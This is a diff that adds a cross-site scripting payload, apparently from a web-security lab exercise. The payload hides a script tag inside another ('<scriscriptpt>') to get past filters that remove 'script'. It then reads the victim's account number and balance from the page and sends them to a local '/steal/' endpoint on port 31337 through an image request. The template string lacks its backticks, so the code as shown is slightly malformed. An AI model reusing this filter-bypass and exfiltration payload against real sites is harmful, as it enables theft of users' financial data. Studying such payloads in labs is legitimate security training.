@@ -1,0 +1,23 @@
+<scriscriptpt>
+
+window.onload = function() {
+
+let account = document.getElementById("account-number").innerText;
+
+accountnum = account.split(' ')[2];
+
+let balance =  document.getElementById("account-balance").innerText;
+
+balancenum = balance.split('$')[1];
+
+console.log(accountnum);
+
+console.log(balance);
+
+let img = new Image();
+
+img.src = http://localhost:31337/steal/?account=${encodeURIComponent(accountnum)}&balance=${encodeURIComponent(balancenum)};
+
+}
+
+</scriscriptpt>
